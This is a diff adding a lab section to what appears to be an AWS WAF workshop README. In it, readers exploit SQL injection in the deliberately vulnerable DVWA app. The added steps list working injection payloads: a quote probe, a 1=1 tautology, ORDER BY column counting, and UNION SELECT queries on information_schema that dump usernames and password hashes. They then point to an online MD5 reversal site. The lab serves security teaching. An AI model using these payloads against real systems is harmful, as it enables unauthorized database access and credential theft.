@@ -137,4 +137,61 @@ In this section we are going to use the [AWS Web Application Firewall](https://a
 
 First we'll prove the vulnerability in DVWA. Browse to the site now served over HTTPS and select **SQL Injection** form the menu on the left.
 
+<details>
+<summary><strong>Exploit the site (expand for details)</strong></summary><p>
+
+1. First we'll check if the site is vunerable to SQL injection, in the input enter the following an click submit.
+
+```
+1'
+```
+
+The site responds with a SQL indicating it tried to execute what we enetered.
+
+1. Now we'll see what information we can return
+
+```
+1' or 1 = 1#
+```
+
+This dumps content from the table
+
+1. We'll now work out how many columns are selected in the original statement
+
+```
+1' order by 3#
+```
+
+This generates an error showing us that the query selects 3 or less columns.
+
+```
+1' order by 2#
+```
+
+1. Lets now return the table name
+
+```
+1' or 1 = 1 union select null, table_name from information_schema.tables#
+```
+
+If we search down the list of tables we'll discover one called **users**
+
+1. We'll now see what columns are avaialble in the table
+
+```
+1' or 1 = 1 union select null, column_name from information_schema.columns where table_name = "users"#
+```
+
+1. Finally we'll dump some data
+
+```
+1' or 1 = 1 union select user,password from users#
+```
+
+This returns a list of usernames and what look like hashed passwords
+
+Using a site to reverse the hash such as https://md5.gromweb.com/ we prove that we can exploite the site to return the password.
+
+</details>
+
 
